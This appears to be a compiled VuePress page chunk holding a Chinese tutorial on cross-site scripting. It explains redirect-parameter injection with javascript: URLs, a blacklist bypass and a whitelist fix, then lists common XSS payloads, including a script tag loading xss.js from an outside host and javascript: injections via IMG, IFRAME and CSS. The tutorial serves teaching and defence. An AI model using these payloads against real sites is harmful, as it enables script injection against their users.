XSS 攻击")]),t._v("。。")])]),t._v(" "),n("h3",{attrs:{id:"_3-xss过滤攻击"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_3-xss过滤攻击"}},[t._v("#")]),t._v(" 3. Xss过滤攻击")]),t._v(" "),n("p",[t._v("当请求为："),n("code",[t._v("http://xxx/?redirect_to=javascript:alert('XSS')")]),t._v(" 时")]),t._v(" "),n("div",{staticClass:"language-html line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-html"}},[n("code",[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("a")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("href")]),n("span",{pre:!0,attrs:{class:"token attr-value"}},[n("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("<%= escapeHTML(getParameter("),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),n("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v('redirect_to"))')]),t._v(" "),n("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("%")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v('">跳转...'),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("a")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br")])]),n("p",[t._v("当攻击 URL 为 "),n("code",[t._v("http://xxx/?redirect_to=javascript:alert('XSS')")]),t._v("，服务端响应就成了：")]),t._v(" "),n("div",{staticClass:"language-html line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-html"}},[n("code",[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("a")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("href")]),n("span",{pre:!0,attrs:{class:"token attr-value"}},[n("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("javascript:alert("),n("span",{pre:!0,attrs:{class:"token entity",title:"&#x27;"}},[t._v("&#x27;")]),t._v("XSS"),n("span",{pre:!0,attrs:{class:"token entity",title:"&#x27;"}},[t._v("&#x27;")]),t._v(")"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("跳转..."),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("a")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br")])]),n("p",[t._v("虽然代码不会立即执行，但一旦用户点击 "),n("code",[t._v("a")]),t._v(" 标签时，浏览器会就会弹出“XSS”。")]),t._v(" "),n("p",[t._v("解决方案 过滤")]),t._v(" "),n("div",{staticClass:"language-js line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-js"}},[n("code",[n("span",{pre:!0,attrs:{class:"token comment"}},[t._v('// 禁止 URL 以 "javascript:" 开头')]),t._v("\nxss "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("getParameter")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"redirect_to"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("startsWith")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'javascript:'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("!")]),t._v("xss"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("a href"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"<%= escapeHTML(getParameter("')]),t._v("redirect_to"),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"))%>"')]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n    跳转"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("...")]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("a"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("else")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("a href"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"/404"')]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n    跳转"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("...")]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("a"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br"),n("span",{staticClass:"line-number"},[t._v("9")]),n("br"),n("span",{staticClass:"line-number"},[t._v("10")]),n("br"),n("span",{staticClass:"line-number"},[t._v("11")]),n("br")])]),n("h3",{attrs:{id:"_4-xss的大小写攻击"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_4-xss的大小写攻击"}},[t._v("#")]),t._v(" 4. Xss的大小写攻击")]),t._v(" "),n("p",[t._v("当请求为："),n("code",[t._v("http://xxx/?redirect_to=%20javascript:alert('XSS')")]),t._v(" 时")]),t._v(" "),n("p",[n("code",[t._v("%20javascript:alert('XSS')")]),t._v(" 经过 URL 解析后变成 "),n("code",[t._v("javascript:alert('XSS')")]),t._v("，这个字符串以空格开头。这样攻击者可以"),n("strong",[t._v("绕过后端的关键词规则")]),t._v("，又成功的完成了注入。")]),t._v(" "),n("p",[t._v("解决方案 "),n("strong",[t._v("白名单")])]),t._v(" "),n("div",{staticClass:"language-js line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-js"}},[n("code",[n("span",{pre:!0,attrs:{class:"token comment"}},[t._v('// 根据项目情况进行过滤，禁止掉 "javascript:" 链接、非法 scheme 等')]),t._v("\nallowSchemes "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"http"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"https"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\nvalid "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("isValid")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("getParameter")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"redirect_to"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" allowSchemes"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("valid"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("a href"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"<%= escapeHTML(getParameter("')]),t._v("redirect_to"),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"))%>"')]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n    跳转"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("...")]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("a"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("else")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("a href"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"/404"')]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n    跳转"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("...")]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("a"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br"),n("span",{staticClass:"line-number"},[t._v("9")]),n("br"),n("span",{staticClass:"line-number"},[t._v("10")]),n("br"),n("span",{staticClass:"line-number"},[t._v("11")]),n("br"),n("span",{staticClass:"line-number"},[t._v("12")]),n("br"),n("span",{staticClass:"line-number"},[t._v("13")]),n("br"),n("span",{staticClass:"line-number"},[t._v("14")]),n("br")])]),n("h3",{attrs:{id:"大结论"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#大结论"}},[t._v("#")]),t._v(" 大结论")]),t._v(" "),n("ul",[n("li",[t._v("在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。")]),t._v(" "),n("li",[t._v("在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。")]),t._v(" "),n("li",[t._v("在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。")]),t._v(" "),n("li",[t._v("在标签的 href、src 等属性中，包含 "),n("code",[t._v("javascript:")]),t._v(" 等可执行代码。")]),t._v(" "),n("li",[t._v("在 onload、onerror、onclick 等事件中，注入不受控制代码。")]),t._v(" "),n("li",[t._v("在 style 属性和标签中，包含类似 "),n("code",[t._v('background-image:url("javascript:...");')]),t._v(" 的代码（新版本浏览器已经可以防范）。")]),t._v(" "),n("li",[t._v("在 style 属性和标签中，包含类似 "),n("code",[t._v("expression(...)")]),t._v(" 的 CSS 表达式代码（新版本浏览器已经可以防范）。")])]),t._v(" "),n("p",[t._v("总之，如果开发者没有将用户输入的文本进行合适的过滤，就贸然插入到 HTML 中，这很容易造成注入漏洞。攻击者可以利用漏洞，构造出恶意的代码指令，进而利用恶意代码危害数据安全。")]),t._v(" "),n("h2",{attrs:{id:"_6-附常见的xss攻击方法"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_6-附常见的xss攻击方法"}},[t._v("#")]),t._v(" 6. 附常见的XSS攻击方法")]),t._v(" "),n("ul",[n("li",[n("a",{attrs:{href:"https://lvtao.net/tag/javascript/",target:"_blank",rel:"noopener noreferrer"}},[t._v("JavaScript"),n("OutboundLink")],1),t._v("注入")])]),t._v(" "),n("div",{staticClass:"language-html line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-html"}},[n("code",[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("SCRIPT")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("SRC")]),n("span",{pre:!0,attrs:{class:"token attr-value"}},[n("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),t._v("http://3w.org/XSS/xss.js")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),n("span",{pre:!0,attrs:{class:"token script"}}),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("SCRIPT")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br")])]),n("ul",[n("li",[t._v("IMG标签XSS")])]),t._v(" "),n("div",{staticClass:"language-html line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-html"}},[n("code",[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("IMG")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("SRC")]),n("span",{pre:!0,attrs:{class:"token attr-value"}},[n("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),t._v("http://3w.org/XSS/xss.js/")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br")])]),n("ul",[n("li",[t._v("IMG标签无分号无引号")])]),t._v(" "),n("div",{staticClass:"language-html line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-html"}},[n("code",[t._v("<IMG SRC=javascript:alert('XSS')>\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br")])]),n("ul",[n("li",[t._v("HTML编码(必须有分号)")])]),t._v(" "),n("div",{staticClass:"language-html line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-html"}},[n("code",[t._v('<IMG SRC=javascript:alert("XSS")>\n')])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br")])]),n("ul",[n("li",[t._v("换码过滤的JavaScript")])]),t._v(" "),n("div",{staticClass:"language-html line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-html"}},[n("code",[t._v("\\\";alert('XSS');//\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br")])]),n("ul",[n("li",[t._v("结束Title标签")])]),t._v(" "),n("div",{staticClass:"language-html line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-html"}},[n("code",[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("TITLE")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("SCRIPT")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),n("span",{pre:!0,attrs:{class:"token script"}},[n("span",{pre:!0,attrs:{class:"token language-javascript"}},[n("span",{pre:!0,attrs:{class:"token function"}},[t._v("alert")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"XSS"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")])])]),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("SCRIPT")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br")])]),n("ul",[n("li",[t._v("Iframe")])]),t._v(" "),n("div",{staticClass:"language-html line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-html"}},[n("code",[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("IFRAME")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("SRC")]),n("span",{pre:!0,attrs:{class:"token attr-value"}},[n("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("javascript:alert("),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")]),t._v("XSS"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")]),t._v(");"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("IFRAME")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br")])]),n("ul",[n("li",[t._v("DIV background-image")])]),t._v(" "),n("div",{staticClass:"language-html line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-html"}},[n("code",[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("DIV")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token style-attr"}},[n("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("STYLE")]),n("span",{pre:!0,attrs:{class:"token attr-value"}},[n("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),n("span",{pre:!0,attrs:{class:"token style language-css"}},[n("span",{pre:!0,attrs:{class:"token property"}},[t._v("background-image")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("url")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token property"}},[t._v("javascript")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("alert")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'XSS'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")])]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])])]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br")])]),n("ul",[n("li",[t._v("节省[http:]")])]),t._v(" "),n("div",{staticClass:"language-html line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-html"}},[n("code",[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("A")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("HREF")]),n("span",{pre:!0,attrs:{class:"token attr-value"}},[n("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("//www.google.com/"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("XSS"),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("A")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br")])]),n("h2",{attrs:{id:"资料"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#资料"}},[t._v("#")]),t._v(" 资料")]),t._v(" "),n("p",[t._v("https://tech.meituan.com/2018/09/27/fe-security.html")]),t._v(" "),n("p",[n("strong",[t._v("标注：有任何不妥的地方望纠正")])]),t._v(" "),n("p",[n("img",{attrs:{src:a(435),alt:"wxm"}})])])}),[],!1,null,null,null);s.default=e.exports}}]);